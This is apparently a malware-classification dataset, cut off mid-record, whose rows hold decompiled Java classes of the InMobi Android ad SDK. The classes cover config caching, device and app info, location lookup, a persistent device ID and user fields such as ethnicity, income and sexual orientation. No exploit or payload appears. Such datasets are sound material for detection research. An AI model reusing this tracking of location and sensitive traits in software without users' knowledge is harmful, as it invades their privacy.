"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\JSONMapBuilder.code","public class JSONMapBuilder implements MapBuilder {   @Override public Map<String,Object> buildMap(  String str) throws Exception {     JSONObject jSONObject=new JSONObject(str);     HashMap hashMap=new HashMap();     a(jSONObject,hashMap);     return hashMap;   }   private void a(  JSONObject jSONObject,  Map<String,Object> map){     Iterator<String> keys=jSONObject.keys();     while (keys.hasNext()) {       String next=keys.next();       try {         Object obj=jSONObject.get(next);         if (obj instanceof JSONObject) {           HashMap hashMap=new HashMap();           map.put(next,hashMap);           a((JSONObject)obj,hashMap);         }  else {           map.put(next,obj);         }       }  catch (      JSONException e) {       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\LocalCache.code","public final class LocalCache {   public static final String DEFAULTURL=""https://inmobisdk-a.akamaihd.net/sdk/configs/400/rootConfig.json"";   public static final String FILENAME=""inmobi.cache"";   private static String a=""{url:'https://inmobisdk-a.akamaihd.net/sdk/configs/400/rootConfig.json'}"";   private static JSONObject b=new JSONObject();   private LocalCache(){   }   public static void initRoot(){     if (b.toString().equals(""{}"")) { synchronized (b) {         try {           try {             String readFileAsString=FileOperations.readFileAsString(InternalSDKUtil.getContext(),FILENAME);             if (readFileAsString == null || """".equals(readFileAsString)) {               Log.internal(InternalSDKUtil.LOGGING_TAG,""Configs not present in persistence. Using default configs."");               readFileAsString=a;             }             b=new JSONObject(readFileAsString);           }  catch (          JSONException e) {             Log.internal(InternalSDKUtil.LOGGING_TAG,""Ill formed JSON while parsing from persistent memory"",e);           }         }  catch (        IOException e2) {           Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to read configs from persistent memory"",e2);         }       }       if (b.toString().equals(""{}"")) {         try {           b=new JSONObject(a);         }  catch (        JSONException e3) {           Log.internal(InternalSDKUtil.LOGGING_TAG,""Default JSON root is unable to parse? What sorcery is this?"",e3);         }       }     }   } public static class a implements Runnable {     a(){     }     @Override public void run(){       LocalCache.c();     }   }   private static void b(){     new Thread(new a()).start();   }   public static void c(){ synchronized (b) {       try {         FileOperations.writeStringToFile(InternalSDKUtil.getContext(),FILENAME,b.toString(),false);       }  catch (      IOException e) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to save all configs to persistent memory"",e);       }     }   }   public static JSONObject addToCache(  String str,  JSONObject jSONObject) throws JSONException { synchronized (b) {       if (b.toString().equals(""{}"")) {         initRoot();       }       b.put(str,jSONObject);     }     b();     return null;   }   public static JSONObject getCacheForProduct(  String str){     if (b.toString().equals(""{}"")) {       initRoot();     }     try {       return b.getJSONObject(str);     }  catch (    JSONException e) {       return null;     }   }   public static void reset(){     b=new JSONObject();     c();     initRoot();   }   public static JSONObject getRoot(){     return b;   }   public static void saveRoot(  JSONObject jSONObject){     b=jSONObject;     b();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\MapBuilder.code","public interface MapBuilder {   Map<String,Object> buildMap(  String str) throws Exception ; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\ProductCacheConfig.code","public class ProductCacheConfig extends ProductConfig {   public static final int DEFAULT_EXPIRY=432000;   public static final int DEFAULT_INTERVAL=60;   public static final int DEFAULT_MAX_RETRY=3;   private static Timer a=new Timer();   private AtomicBoolean b;   private Map<String,String> c;   private CacheController.Validator d;   private RetryMechanism e;   private CacheController.Committer f;   private long g; public class b {     private String b;     private long c;     private b(){     }     b(    ProductCacheConfig productCacheConfig,    a aVar){       this();     }   }   public Map<String,String> getMap(){     return this.c;   }   public void setMap(  Map<String,String> map){     this.c=map;   }   public CacheController.Validator getValidator(){     return this.d;   }   public void setValidator(  CacheController.Validator validator){     this.d=validator;   }   public ProductCacheConfig(  JSONObject jSONObject,  CacheController.Committer committer){     this(jSONObject);     this.f=committer;   }   public ProductCacheConfig(  JSONObject jSONObject){     this.b=new AtomicBoolean(false);     this.c=new HashMap();     this.d=null;     this.e=new RetryMechanism(3,60000,a);     try {       loadFromJSON(jSONObject);     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""JSON retrieved is invalid."");     }   }   public ProductConfig getConfig(){     return this;   }   public final void loadFromJSON(  JSONObject jSONObject){     setExpiry(InternalSDKUtil.getIntFromJSON(jSONObject,""expiry"",DEFAULT_EXPIRY));     setMaxRetry(InternalSDKUtil.getIntFromJSON(jSONObject,""maxRetry"",3));     setRetryInterval(InternalSDKUtil.getIntFromJSON(jSONObject,""retryInterval"",60));     this.g=InternalSDKUtil.getLongFromJSON(jSONObject,""lastModified"",0L);     setUrl(InternalSDKUtil.getStringFromJSON(jSONObject,""url"",""""));     setProtocol(InternalSDKUtil.getStringFromJSON(jSONObject,""protocol"",""json""));     this.e=new RetryMechanism(getMaxRetry(),getRetryInterval() * 1000,a);     setTimestamp(InternalSDKUtil.getIntFromJSON(jSONObject,""timestamp"",0));     setData(InternalSDKUtil.getStringFromJSON(jSONObject,""data"",null));   }   public String getData(  CacheController.Validator validator){     if (validator != null) {       this.d=validator;     }     setRetryNumber(0);     if ((getTimestamp() + getExpiry()) - ((int)(System.currentTimeMillis() / 1000)) <= 0) {       b();     }     return getRawData();   }   public JSONObject toJSON(){     JSONObject jSONObject;     JSONException e;     JSONObject jSONObject2=new JSONObject();     try {       jSONObject=new JSONObject(""{expiry:"" + getExpiry() + "",maxRetry:""+ getMaxRetry()+ "",retryInterval:""+ getRetryInterval()+ "",protocol:""+ getProtocol()+ "",timestamp:""+ getTimestamp()+ ""}"");       try {         jSONObject.put(""url"",getUrl());         jSONObject.put(""data"",getRawData());         jSONObject.put(""lastModified"",this.g);       }  catch (      JSONException e2) {         e=e2;         Log.internal(InternalSDKUtil.LOGGING_TAG,""Ill formed JSON product("" + getUrl() + "") toString"",e);         return jSONObject;       }     }  catch (    JSONException e3) {       jSONObject=jSONObject2;       e=e3;     }     return jSONObject;   }   public String toString(){     return toJSON().toString();   }   public void a() throws Exception {     try {       b c=c();       String str=c.b;       if (str != null) {         if (this.d != null) {           if (this.d.validate(a(str))) {             setData(str);           }  else {             throw new IOException(""Invalid config."");           }         }  else {           setData(str);         }         setTimestamp((int)(System.currentTimeMillis() / 1000));         this.g=c.c;         Log.internal(InternalSDKUtil.LOGGING_TAG,""Product with url "" + getUrl() + "" accepted data ""+ getRawData());         this.f.onCommit();         return;       }       setTimestamp((int)(System.currentTimeMillis() / 1000));       this.g=c.c;       this.f.onCommit();     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Error connecting to url, or "" + getUrl() + "" did not return 200. Purge cache update."",e);       throw e;     }   }   private void b(){     if (this.b.compareAndSet(false,true)) {       this.e.rescheduleTimer(new a());     }   } public class a implements RetryMechanism.RetryRunnable {     a(){     }     @Override public void run() throws Exception {       try {         if (InternalSDKUtil.checkNetworkAvailibility(InternalSDKUtil.getContext())) {           ProductCacheConfig.this.a();           return;         }         throw new IOException(""Network unavailable"");       }  catch (      Exception e) {         throw e;       }     }     @Override public void completed(){       ProductCacheConfig.this.b.set(false);     }   }   protected void reset(){     setExpiry(0);     setRetryInterval(0);     setMaxRetry(0);     setTimestamp(0);     setUrl(null);     setProtocol(null);     setData(null);   }   private b c() throws IOException {     String url;     a aVar=null;     String str="""";     String bindToGetParam=UIDUtil.bindToGetParam(this.c);     if (bindToGetParam != null && !"""".equals(bindToGetParam)) {       if (getUrl().endsWith(""?"")) {         url=getUrl() + bindToGetParam;       }  else       if (getUrl().contains(""?"")) {         url=getUrl() + ""&"" + bindToGetParam;       }  else {         url=getUrl() + ""?"" + bindToGetParam;       }     }  else {       url=getUrl();     }     URL url2=new URL(url);     Log.internal(InternalSDKUtil.LOGGING_TAG,""Sending request to "" + url + "" to retreive cache.."");     HttpURLConnection httpURLConnection=(HttpURLConnection)url2.openConnection();     InternalSDKUtil.addCommonPropertiesToConnection(httpURLConnection);     httpURLConnection.setIfModifiedSince(this.g);     httpURLConnection.setRequestMethod(""GET"");     int responseCode=httpURLConnection.getResponseCode();     if (responseCode == 304) {       b bVar=new b(this,aVar);       bVar.b=null;       bVar.c=httpURLConnection.getLastModified();       return bVar;     }     if (responseCode != 200) {       throw new IOException(""Server did not return 200. "");     }     BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));     while (true) {       String readLine=bufferedReader.readLine();       if (readLine != null) {         str=str + readLine;       }  else {         bufferedReader.close();         b bVar2=new b(this,aVar);         bVar2.b=str;         bVar2.c=httpURLConnection.getLastModified();         return bVar2;       }     }   }   public String getData(  Map<String,String> map,  CacheController.Validator validator){     if (map != null) {       this.c=map;     }     return getData(validator);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\ProductConfig.code","public abstract class ProductConfig {   private String a=null;   private String b=null;   private String c=null;   private int d=0;   private int e=3;   private int f=60;   private int g=0;   private int h=-1;   private boolean i=true;   public Map<String,Object> a(  String str) throws Exception {     if (getProtocol().equals(""json"")) {       return new JSONMapBuilder().buildMap(str);     }     HashMap hashMap=new HashMap();     hashMap.put(""data"",str);     return hashMap;   }   public String getUrl(){     return this.a;   }   public String getProtocol(){     return this.b;   }   public Map<String,Object> getData() throws Exception {     return a(this.c);   }   public String getRawData(){     return this.c;   }   public int getExpiry(){     return this.d;   }   public int getMaxRetry(){     return this.e;   }   public int getTimestamp(){     return this.h;   }   public boolean isSendUidMap(){     return this.i;   }   public void setUrl(  String str){     this.a=str;   }   public void setProtocol(  String str){     this.b=str;   }   public void setData(  String str){     this.c=str;   }   public void setExpiry(  int i){     this.d=i;   }   public void setMaxRetry(  int i){     this.e=i;   }   public void setRetryInterval(  int i){     this.f=i;   }   public void setRetryNumber(  int i){     this.g=i;   }   public void setTimestamp(  int i){     this.h=i;   }   public void setSendUidMap(  boolean z){     this.i=z;   }   public int getRetryInterval(){     return this.f;   }   public int getRetryNumber(){     return this.g;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\RetryMechanism.code","public class RetryMechanism {   private Timer a;   private int b=0;   private int c;   private int d; public interface RetryRunnable {     void completed();     void run() throws Exception ;   }   static int a(  RetryMechanism retryMechanism){     int i=retryMechanism.b;     retryMechanism.b=i + 1;     return i;   }   public RetryMechanism(  int i,  int i2,  Timer timer){     this.c=0;     this.d=1000;     this.c=i;     this.d=i2;     this.a=timer;   }   public void rescheduleTimer(  RetryRunnable retryRunnable){     this.b=0;     a(retryRunnable,0);   } public class a extends TimerTask {     final RetryRunnable a;     a(    RetryRunnable retryRunnable){       this.a=retryRunnable;     }     @Override public void run(){       try {         this.a.run();         this.a.completed();       }  catch (      Exception e) {         RetryMechanism.a(RetryMechanism.this);         if (RetryMechanism.this.b > RetryMechanism.this.c) {           Log.internal(InternalSDKUtil.LOGGING_TAG,""Exception occured while running retry mechanism and will the limit for retrying has been reached."");           this.a.completed();         }  else {           Log.internal(InternalSDKUtil.LOGGING_TAG,""Exception occured while running retry mechanism and will retry in "" + (RetryMechanism.this.b * RetryMechanism.this.d) + "" ms"");           RetryMechanism.this.a(this.a,RetryMechanism.this.b * RetryMechanism.this.d);         }       }     }   }   public void a(  RetryRunnable retryRunnable,  int i){     this.a.schedule(new a(retryRunnable),i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\RetryRunnable.code","public interface RetryRunnable {   void completed();   void run() throws Exception ; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\Validator.code","public interface Validator {   boolean validate(  Map<String,Object> map); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.data\AppInfo.code","public class AppInfo {   private static String a;   private static String b;   private static String c;   private static String d;   public static String getAppDisplayName(){     return b;   }   private static void a(  String str){     b=str;   }   public static String getAppId(){     return d;   }   public static void setAppId(  String str){     d=str;   }   public static String getAppBId(){     return a;   }   private static void b(  String str){     a=str;   }   public static String getAppVer(){     return c;   }   private static void c(  String str){     c=str;   }   public static void fillAppInfo(){     try {       Context context=InternalSDKUtil.getContext();       PackageManager packageManager=context.getPackageManager();       ApplicationInfo applicationInfo=packageManager.getApplicationInfo(context.getPackageName(),a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);       if (applicationInfo != null) {         b(applicationInfo.packageName);         a(applicationInfo.loadLabel(packageManager).toString());       }       PackageInfo packageInfo=packageManager.getPackageInfo(context.getPackageName(),a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);       String str=null;       if (packageInfo != null && ((str=packageInfo.versionName) == null || str.equals(""""))) {         str=packageInfo.versionCode + """";       }       if (str != null && !str.equals("""")) {         c(str);       }     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to fill AppInfo"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.data\DeviceInfo.code","public class DeviceInfo {   private static String a;   private static String b;   private static String c;   private static String f;   private static String g;   private static int h;   private Activity i;   private static String d=null;   private static String e=null;   private static DeviceInfo j=new DeviceInfo();   public void init(  Activity activity){     this.i=activity;   }   public static DeviceInfo getInstance(){     return j;   }   private DeviceInfo(){   }   public static String getNetworkType(){     return a;   }   private static void a(  String str){     a=str;   }   private static void a(  Context context){     try {       if (f == null) {         f=context.getSharedPreferences(""inmobisdkaid"",0).getString(""A_ID"",null);       }       if (f == null) {         f=UUID.randomUUID().toString();         SharedPreferences.Editor edit=context.getSharedPreferences(""inmobisdkaid"",0).edit();         edit.putString(""A_ID"",f);         edit.commit();       }     }  catch (    Exception e2) {     }   }   public static String getAid(){     return f;   }   public static String getLocalization(){     return b;   }   private static void b(  String str){     b=str;   }   private static String a(){     return c;   }   private static void c(  String str){     c=str;   }   public static String getPhoneDefaultUserAgent(){     return g == null ? """" : g;   }   public static String getScreenSize(){     return d;   }   public static void setScreenSize(  String str){     d=str;   }   public static String getScreenDensity(){     return e;   }   public static void setScreenDensity(  String str){     e=str;   }   public static int getOrientation(){     return h;   }   private static void a(  int i){     h=i;   }   public void fillDeviceInfo(){     String str;     if (a() == null) {       c(Build.BRAND);       Locale locale=Locale.getDefault();       String language=locale.getLanguage();       if (language != null) {         str=language.toLowerCase(Locale.ENGLISH);         String country=locale.getCountry();         if (country != null) {           str=str + ""_"" + country.toLowerCase(Locale.ENGLISH);         }       }  else {         String str2=(String)System.getProperties().get(""user.language"");         String str3=(String)System.getProperties().get(""user.region"");         str=(str2 == null || str3 == null) ? language : str2 + ""_"" + str3;         if (str == null) {           str=Values.LANGUAGE;         }       }       b(str);     }     if (InternalSDKUtil.getContext() != null) {       a(InternalSDKUtil.getContext());     }     a(InternalSDKUtil.getConnectivityType(InternalSDKUtil.getContext()));     try {       int currentOrientationInFixedValues=WrapperFunctions.getCurrentOrientationInFixedValues(this.i);       if (currentOrientationInFixedValues == 9) {         a(2);       }  else       if (currentOrientationInFixedValues == 8) {         a(4);       }  else       if (currentOrientationInFixedValues == 0) {         a(3);       }  else {         a(1);       }     }  catch (    Exception e2) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Error getting the orientation info "",e2);     }   }   public static void setPhoneDefaultUserAgent(  String str){     g=str;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.data\LocationInfo.code","public class LocationInfo {   private static LocationManager a;   private static boolean b;   private static double c;   private static double d;   private static double e;   private static boolean f;   private static long g;   private static synchronized LocationManager a(){     LocationManager locationManager; synchronized (LocationInfo.class) {       locationManager=a;     }     return locationManager;   }   private static synchronized void a(  LocationManager locationManager){ synchronized (LocationInfo.class) {       a=locationManager;     }   }   public static boolean isLocationDeniedByUser(){     return b;   }   public static void a(  boolean z){     b=z;   }   public static double getLat(){     return c;   }   private static void a(  double d2){     c=d2;   }   public static double getLon(){     return d;   }   private static void b(  double d2){     d=d2;   }   public static double getLocAccuracy(){     return e;   }   private static void c(  double d2){     e=d2;   }   public static boolean isValidGeoInfo(){     return f;   }   public static void b(  boolean z){     f=z;   }   public static long getGeoTS(){     return g;   }   private static void a(  long j){     g=j;   }   public static void updateBestKnownLocation(){     try {       if (a() == null) {         a((LocationManager)InternalSDKUtil.getContext().getSystemService(""location""));       }       if (a() != null) {         LocationManager a2=a();         Criteria criteria=new Criteria();         if (InternalSDKUtil.getContext().checkCallingOrSelfPermission(""android.permission.ACCESS_FINE_LOCATION"") == 0) {           criteria.setAccuracy(1);         }  else         if (InternalSDKUtil.getContext().checkCallingOrSelfPermission(""android.permission.ACCESS_COARSE_LOCATION"") == 0) {           criteria.setAccuracy(2);         }         criteria.setCostAllowed(false);         String bestProvider=a2.getBestProvider(criteria,true);         if (!isValidGeoInfo() && bestProvider != null) {           Location lastKnownLocation=a2.getLastKnownLocation(bestProvider);           Log.debug(InternalSDKUtil.LOGGING_TAG,""lastBestKnownLocation: "" + lastKnownLocation);           if (lastKnownLocation == null) {             lastKnownLocation=b();             Log.debug(InternalSDKUtil.LOGGING_TAG,""lastKnownLocation: "" + lastKnownLocation);           }           a(lastKnownLocation);         }       }     }  catch (    Exception e2) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Error getting the Location Info "",e2);     }   }   private static Location b(){     Location lastKnownLocation;     if (a() == null) {       a((LocationManager)InternalSDKUtil.getContext().getSystemService(""location""));     }     if (a() != null) {       LocationManager a2=a();       List<String> providers=a2.getProviders(true);       for (int size=providers.size() - 1; size >= 0; size--) {         String str=providers.get(size);         if (a2.isProviderEnabled(str) && (lastKnownLocation=a2.getLastKnownLocation(str)) != null) {           return lastKnownLocation;         }       }     }     return null;   }   public static void a(  Location location){     if (location != null) {       b(true);       a(location.getLatitude());       b(location.getLongitude());       c(location.getAccuracy());       a(location.getTime());     }   }   public static void verifyLocationPermission(){     int checkCallingOrSelfPermission=InternalSDKUtil.getContext().checkCallingOrSelfPermission(""android.permission.ACCESS_COARSE_LOCATION"");     int checkCallingOrSelfPermission2=InternalSDKUtil.getContext().checkCallingOrSelfPermission(""android.permission.ACCESS_FINE_LOCATION"");     if (checkCallingOrSelfPermission != 0 && checkCallingOrSelfPermission2 != 0) {       a(true);     }  else {       a(false);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.data\UserInfo.code","public final class UserInfo {   private static UserInfo a=new UserInfo();   private static int d=1;   private boolean b;   private Activity c;   private Location e;   private String g;   private EducationType h;   private EthnicityType i;   private GenderType j;   private Calendar k;   private String n;   private String o;   private String p;   private String q;   private HasChildren r;   private MaritalStatus s;   private String t;   private SexualOrientation u;   private boolean f=true;   private Integer l=0;   private Integer m=0;   private Map<IMIDType,String> v=new HashMap();   public static UserInfo getInstance(){     return a;   }   private UserInfo(){   }   public void setActivity(  Activity activity){     this.c=activity;     DeviceInfo.getInstance().init(this.c);   }   public Location getCurrentLocation(){     return this.e;   }   public void setCurrentLocation(  Location location){     this.e=location;   }   public void setLocationWithCityStateCountry(  String str,  String str2,  String str3){     if (str != null && !"""".equals(str.trim())) {       this.o=str;     }     if (str2 != null && !"""".equals(str2.trim())) {       this.o+=""-"" + str2;     }     if (str3 != null && !"""".equals(str3.trim())) {       this.o+=""-"" + str3;     }   }   public String getLocationWithCityStateCountry(){     return this.o;   }   public void setLocationInquiryAllowed(  boolean z){     this.f=z;   }   public boolean isLocationInquiryAllowed(){     return this.f;   }   public String getSearchString(){     return this.g;   }   public String getPostalCode(){     return this.p;   }   public void setPostalCode(  String str){     this.p=str;   }   public String getAreaCode(){     return this.q;   }   public void setAreaCode(  String str){     this.q=str;   }   public Calendar getDateOfBirth(){     return this.k;   }   public void setDateOfBirth(  Calendar calendar){     this.k=calendar;   }   public Integer getIncome(){     return this.l;   }   public void setIncome(  Integer num){     this.l=num;   }   public Integer getAge(){     return this.m;   }   public void setAge(  Integer num){     this.m=num;   }   public EducationType getEducation(){     return this.h;   }   public void setEducation(  EducationType educationType){     this.h=educationType;   }   public EthnicityType getEthnicity(){     return this.i;   }   public void setEthnicity(  EthnicityType ethnicityType){     this.i=ethnicityType;   }   public void setGender(  GenderType genderType){     this.j=genderType;   }   public GenderType getGender(){     return this.j;   }   public String getInterests(){     return this.n;   }   public void setInterests(  String str){     this.n=str;   }   public void addIDType(  IMIDType iMIDType,  String str){     if (this.v != null) {       this.v.put(iMIDType,str);     }   }   public String getIDType(  IMIDType iMIDType){     if (this.v != null) {       return this.v.get(iMIDType);     }     return null;   }   public void removeIDType(  IMIDType iMIDType){     if (this.v != null) {       this.v.remove(iMIDType);     }   }   public void setTestMode(  boolean z){     this.b=z;   }   public boolean isTestMode(){     return this.b;   }   public MaritalStatus getMaritalStatus(){     return this.s;   }   public void setMaritalStatus(  MaritalStatus maritalStatus){     this.s=maritalStatus;   }   public String getLanguage(){     return this.t;   }   public void setLanguage(  String str){     this.t=str;   }   public SexualOrientation getSexualOrientation(){     return this.u;   }   public void setSexualOrientation(  SexualOrientation sexualOrientation){     this.u=sexualOrientation;   }   public void setHasChildren(  HasChildren hasChildren){     this.r=hasChildren;   }   public HasChildren getHasChildren(){     return this.r;   }   public void setDeviceIDMask(  int i){     d=i;   }   public int getDeviceIDMask(){     return d;   }   public synchronized void updateInfo(){     try {       DisplayMetrics displayMetrics=new DisplayMetrics();       this.c.getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);       float f=displayMetrics.density;       Display defaultDisplay=((WindowManager)this.c.getSystemService(""window"")).getDefaultDisplay();       DeviceInfo.setScreenDensity(String.valueOf(f));       DeviceInfo.setScreenSize("""" + ((int)(WrapperFunctions.getDisplayWidth(defaultDisplay) / f)) + ""X""+ ((int)(WrapperFunctions.getDisplayHeight(defaultDisplay) / f)));       DeviceInfo.setPhoneDefaultUserAgent(InternalSDKUtil.getUserAgent(this.c.getApplicationContext()));       DeviceInfo.getInstance().fillDeviceInfo();       AppInfo.fillAppInfo();       LocationInfo.b(false);       if (isLocationInquiryAllowed()) {         if (getCurrentLocation() != null) {           LocationInfo.a(getCurrentLocation());           LocationInfo.b(true);         }  else {           LocationInfo.verifyLocationPermission();           if (!LocationInfo.isLocationDeniedByUser()) {             LocationInfo.updateBestKnownLocation();           }         }       }  else {         LocationInfo.a(true);       }     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Exception updating user info"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.db\ColumnData.code","public class ColumnData {   private boolean a=false;   private boolean b=false;   private boolean c=false;   private ColumnType d;   public enum ColumnType {  INTEGER,   VARCHAR,   REAL,   TEXT}   public ColumnType getDataType(){     return this.d;   }   public void setDataType(  ColumnType columnType){     this.d=columnType;   }   public boolean isPrimaryKey(){     return this.a;   }   public void setPrimaryKey(  boolean z){     this.a=z;   }   public boolean isAutoIncrement(){     return this.b;   }   public void setAutoIncrement(  boolean z){     this.b=z;   }   public boolean isMandatory(){     return this.c;   }   public void setMandatory(  boolean z){     this.c=z;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.db\DatabaseHandler.code","public abstract class DatabaseHandler extends SQLiteOpenHelper {   public static final String DATABASE_NAME=""im.db"";   private static String c=""CREATE TABLE IF NOT EXISTS "";   private static String d=""DROP TABLE IF EXISTS "";   private static String e="" PRIMARY KEY "";   private static String f="" AUTOINCREMENT "";   private static String g="" NOT NULL "";   private static String h=""SELECT * FROM "";   private static String i="" WHERE "";   private static String j="" ORDER BY "";   private static String k=""; "";   private static String l="" Limit ?"";   private ArrayList<TableData> a;   private SQLiteDatabase b;   public DatabaseHandler(  Context context,  ArrayList<TableData> arrayList){     super(context,DATABASE_NAME,(SQLiteDatabase.CursorFactory)null,1);     this.a=arrayList;   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     try {       a(sQLiteDatabase);     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Exception Creating table"",e2);     }   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i2,  int i3){     try {       Iterator<TableData> it=this.a.iterator();       while (it.hasNext()) {         sQLiteDatabase.execSQL(d + it.next().getmTableName());       }       onCreate(sQLiteDatabase);     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Exception Deleting table"",e2);     }   }   public void open(){     try {       this.b=getWritableDatabase();     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to open  db"",e2);     }   }   @Override public void close(){     try {       this.b.close();     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to close  db"",e2);     }   }   public synchronized long insert(  String str,  ContentValues contentValues){     long j2;     try {       j2=this.b.insert(str,null,contentValues);     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to insert to db"",e2);       j2=-1;     }     return j2;   }   public synchronized int delete(  String str,  String str2,  String[] strArr){     int i2;     try {       i2=this.b.delete(str,str2,strArr);     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to insert to db"",e2);       i2=-1;     }     return i2;   }   public synchronized long update(  String str,  ContentValues contentValues,  String str2,  String[] strArr){     long j2;     try {       j2=this.b.update(str,contentValues,str2,strArr);     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to insert to db"",e2);       j2=-1;     }     return j2;   }   public synchronized Cursor getRow(  String str,  String str2,  String[] strArr){     Cursor rawQuery;     Cursor cursor=null; synchronized (this) {       if (str2 != null) {         try {         }  catch (        Exception e2) {           Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to all rows"",e2);         }         if (!"""".equals(str2.trim())) {           rawQuery=this.b.rawQuery(h + str + i+ str2+ k,strArr);           rawQuery.moveToFirst();           cursor=rawQuery;         }       }       rawQuery=this.b.rawQuery(h + str + k,null);       rawQuery.moveToFirst();       cursor=rawQuery;     }     return cursor;   }   public synchronized Cursor getAll(  String str,  String str2){     Cursor rawQuery;     Cursor cursor=null; synchronized (this) {       if (str2 != null) {         try {         }  catch (        Exception e2) {           Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to all rows"",e2);         }         if (!"""".equals(str2.trim())) {           rawQuery=this.b.rawQuery(h + str + j+ str2+ k,null);           rawQuery.moveToFirst();           cursor=rawQuery;         }       }       rawQuery=this.b.rawQuery(h + str + k,null);       rawQuery.moveToFirst();       cursor=rawQuery;     }     return cursor;   }   public synchronized Cursor getNRows(  String str,  String str2,  int i2){     Cursor rawQuery;     Cursor cursor=null; synchronized (this) {       if (str2 != null) {         try {         }  catch (        Exception e2) {           Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to all rows"",e2);         }         if (!"""".equals(str2.trim())) {           rawQuery=this.b.rawQuery(h + str + j+ str2+ l+ k,new String[]{String.valueOf(i2)});           rawQuery.moveToFirst();           cursor=rawQuery;         }       }       rawQuery=this.b.rawQuery(h + str + k,null);       rawQuery.moveToFirst();       cursor=rawQuery;     }     return cursor;   }   public synchronized int getNoOfRows(  String str,  String str2,  String[] strArr){     Cursor rawQuery;     int i2;     if (str2 != null) {       try {       }  catch (      Exception e2) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to get number of rows"",e2);         i2=0;       }       if (!"""".equals(str2.trim())) {         rawQuery=this.b.rawQuery(h + str + i+ str2,strArr);         i2=rawQuery.getCount();         rawQuery.close();       }     }     rawQuery=this.b.rawQuery(h + str + k,null);     i2=rawQuery.getCount();     rawQuery.close();     return i2;   }   public synchronized int getTableSize(  String str){     int i2;     try {       Cursor rawQuery=this.b.rawQuery(h + str + k,null);       i2=rawQuery.getCount();       rawQuery.close();     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to table size "",e2);       i2=0;     }     return i2;   }   public synchronized Cursor executeQuery(  String str,  String[] strArr){     Cursor cursor;     try {       cursor=this.b.rawQuery(str,strArr);     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to execute db query"",e2);       cursor=null;     }     return cursor;   }   private void a(  SQLiteDatabase sQLiteDatabase){     String sb;     try {       if (this.a != null && !this.a.isEmpty()) {         Iterator<TableData> it=this.a.iterator();         while (it.hasNext()) {           TableData next=it.next();           String str=next.getmTableName();           LinkedHashMap<String,ColumnData> linkedHashMap=next.getmColumns();           StringBuilder sb2=new StringBuilder(c + str + "" ("");           for (          String str2 : linkedHashMap.keySet()) {             ColumnData columnData=linkedHashMap.get(str2);             sb2.append("" "" + str2 + "" ""+ columnData.getDataType().toString());             if (columnData.isPrimaryKey()) {               sb2.append(e);             }             if (columnData.isAutoIncrement()) {               sb2.append(f);             }             if (columnData.isMandatory()) {               sb2.append(g);             }             sb2.append("","");           }           if (',' == sb2.charAt(sb2.length() - 1)) {             sb=sb2.substring(0,sb2.length() - 2);           }  else {             sb=sb2.toString();           }           String concat=sb.concat("" );"");           